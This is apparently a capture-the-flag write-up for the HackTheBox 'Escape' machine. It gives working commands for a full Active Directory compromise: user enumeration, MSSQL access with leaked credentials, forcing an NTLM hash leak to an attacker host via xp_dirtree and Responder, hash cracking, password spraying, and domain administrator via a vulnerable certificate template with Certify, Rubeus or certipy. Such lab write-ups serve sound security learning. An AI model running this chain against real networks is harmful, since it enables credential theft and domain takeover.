<h2> Target: 10.10.11.202 Escape</h2>

<b>Initial Access:</b><br>
Step 1: nmap 10.10.11.202 -Pn --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Nmap shows open ports:<br> 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49704,49712,57663

Step 2: Enumerate these open ports further using nmap: nmap 10.10.11.202 -Pn --min-rate=5000 -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49704,49712,57663 -sC -sV -oN nmap-escape

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/3653d8b6-4f2b-4213-89bf-7178ff3085e1)

Step 3: Nmap shows domain names, enter them into the file /etc/hosts: 10.10.11.202  sequel.htb  dc.sequel.htb

Step 4: Find usernames: lookupsid.py sequel.htb/anonymous@10.10.11.202| awk '{print $2}' |sed 's/sequel\\//g' > ulist→ when prompted for password just press ‘enter’ 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/8ce7aa7e-be10-43c5-8e72-9c7d3efee58d) 
 
Delete the non usernames returned in the list so that the username list only contains the following:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/a2e62caa-e92e-43f7-ab3f-5ce814e695f7) 

Step 5: Check if we can read any smb shares with any of the usernames we found: for i in \`cat ulist\`;do smbmap -H sequel.htb -u $i;done

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/d2006ea2-860d-4716-acf6-6c0b3badc0fa)

Smbmap shows username ‘guest’ has read access to ‘public’ and ‘IPC$’. 

Step 6: Check if we have anything interesting in the ‘Public’ share: <br>
smbclient //sequel.htb/Public -U guest → press ‘enter’ when prompted for a password.

Once we are in smbclient run the command ‘ls’:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/617f3413-1b3b-4ba0-83ec-e72191c94555)

Smbclient shows we have a file called "SQL Server Procedures.pdf".  Download this file using command: get “SQL Server Procedures.pdf”

Step 7: Open the pdf document using command: xdg-open 'SQL Server Procedures.pdf':

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/9c4d83aa-92bf-4263-b344-8476bd06f20b) 

The document shows credentials for a Database: PublicUser:GuestUserCantWrite1

Step 8: Nmap showed we have port 1433 open which is for mssql database.  Try the credentials for mssql: mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202

We log in successfully. 

Step 9: Try to steal hash of sql user.  First set up responder to catch the hash: sudo responder -I tun0

Next, in mssql shell run the command: xp_dirtree '\\10.10.14.93\any\thing'


![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/8a14909c-8b77-4374-9ac4-570fdb3ff662) 

Responder captured sql_svc’s hash.  Save the hash in a file called ‘hash’. 

Step 10: Before we use john to crack the hash, use the command ‘nth’ to ensure we are giving john the correct format value: nth -f hash

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/7c897e84-4d88-4c05-b2cc-f8cd63adf2dd) 

nth shows the correct format value for john is netntlmv2

Step 11: Use john to crack the hash: john hash --wordlist=/usr/share/wordlists/rockyou.txt –format=netntlmv2 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/72d3d1a4-487b-4075-9c34-cf41d3e39d16)

John cracked the hash: REGGIE1234ronnie

Step 12: Check if we can login to winrm using this password:  crackmapexec winrm sequel.htb -u ulist-kerbrute -p REGGIE1234ronnie

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/21772897-8511-4631-8026-351367cf7fba) 

crackmapexec shows we can log into winrm using user sql_svc with the password REGGIE1234ronnie.

Step 13: Log into winrm: evil-winrm -i sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
________________________________________________________
<b>Lateral Movement:</b><br>

Step 1: The file C:\SQLServer\Logs\ERRORLOG.BAK shows a failed logon by a user called ‘NuclearMosquito3’.  This is not a username in our username list ‘ulist’.  It seems like this may be a password that was mistakenly typed in as a username:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6f691c9c-8148-4963-bf13-e39acc5699db) 

Step 2: Check if that password works with one of the usernames in our ‘ulist’ file: crackmapexec smb sequel.htb -u ulist-kerbrute -p "NuclearMosquito3" --continue-on-success
 
![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/4a8f7332-69a7-472e-ab22-28ceccaaffec) 

Crackmapexec shows username Ryan.Cooper has password NuclearMosquito3.

Step 3: Log into winrm: evil-winrm -i sequel.htb -u Ryan.Cooper -p "NuclearMosquito3"

We have a shell as user Ryan.Cooper.  We can get the flag in C:\Users\Ryan.Cooper\Dekstop\user.txt
________________________________________
<b>Privilege Escalation:</b><br>
Step 1: whoami /groups

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/a7657dab-d5a7-42fe-a343-43067472dcd7) 

Step 2: The group ‘Certificate Service DCOM Access’ looks interesting.  Google search “BUILTIN\Certificate Service DCOM Access  exploit” finds plenty of articles on how to exploit this group:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/ab7b281c-77a5-4cb3-bd50-6d6a98bf286b) 
  
Reading some articles reveals that when vulnerable we can use this group to create a golden ticket.  We can check if the target is vulnerable and create a golden ticket using either ‘certify’ or ‘certipy’.  We will first show this with ‘certify’ (steps 3-10) and then we will show how to perform this with ‘certipy’ (located after step 10).  

Step 3: Download certify (https://github.com/GhostPack/Certify), compile it into .exe, and upload Certify.exe to the target.  

Step 4: Check if the target has a vulnerable template by running the following command on the target shell:<br>  ./Certify.exe find /vulnerable

The output to this command shows that it has a vulnerable template:
![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/3b54f84f-8087-4699-84b2-69dcf3a7e5a3) 

Step 5: In order to perform the next command we will need the ‘CA Name’ and the ‘Vulnerable Template Name’.  Both of these values can be found in the output to the previous command (see screenshot above).  

Generate a certificate containing an RSA private and public key by running the following on the target shell: ./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator 

Step 6: On our local pc create a file called ‘cert.pem’ that contains the RSA private and public key we generated in the previous command.  

Step 7: On our local pc, convert the cert.pem to a cert.pfx by using the command: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Upload the cert.pfx file to the target. 

Step 8: Use the cert.pfx to create a ticket.  In order to do this we will need rubeus.exe.  Download rubeus (https://github.com/GhostPack/Rubeus), compile rubeus into rubeus.exe, and upload rubeus.exe to the target.   

Step 9: Create a golden ticket by running on the target shell the following command ./rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /outfile:administrator.kirbi /ptt
 
After the command executes successfully, we will have a file called administrator.kirbi that contains our golden ticket:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/45ce78f7-2e09-45ca-82f4-5832601c8b30)
 
Step 10:  Download the administrator.kirbi to our local pc.  

On our local pc, convert the administrator.kirbi to administrator.ccache: impacket-ticketConverter administrator.kirbi administrator.ccache
__________________________________________
Steps 3-10 used ‘certify’, we will now show how steps 3-10 can be performed using ‘certipy’.   If you just want to use ‘certify’ then you can skip this and continue onto step 11.

First, find if vulnerable, get CA name, and the vulnerable template name by running on our local pc the command: certipy-ad find -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202 -debug

Next, create a pfx file by running on our local pc the command: certipy-ad req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -ca sequel-DC-CA -debug -template UserAuthentication -upn Administrator@sequel.htb

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/8b03315f-8618-41d1-a296-f8e2b4b36a8b) 
 
Finally, get a golden ticket and create a .ccache file by running on our local pc the command: certipy-ad auth -pfx 'administrator.pfx' -username 'Administrator' -domain 'sequel.htb' -dc-ip 10.10.11.202


![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/00c8e84c-653e-4fef-b780-ea7a6370c6d1) 
______________________________________________

Step 11: On our local pc, set the KRB5CCNAME environment variable to administrator.ccache.  We can do this by running the command: export KRB5CCNAME=administrator.ccache  

The command ‘export KRB5CCNAME=administrator.ccache’ specifies the location and name of the Kerberos credential cache file. The credential cache file (administrator.ccache in this example) stores the user's Kerberos tickets, which are used to authenticate the user to services within the realm without requiring the user to re-enter their password.  By setting the KRB5CCNAME environment variable to administrator.ccache, the Kerberos-related utilities and services on the system will know where to find the credential cache file and use it for authentication purposes.

Step 12: In order for the attack to work we need to make sure our pc time is synced with the target time.  We can do this by running the command: ntpdate 10.10.11.202

Step 13: Log into the target shell as the Administrator: psexec.py sequel.htb/Administrator@dc.sequel.htb -no-pass -k

We can get the flag in C:\Users\Administrator\Desktop\root.txt
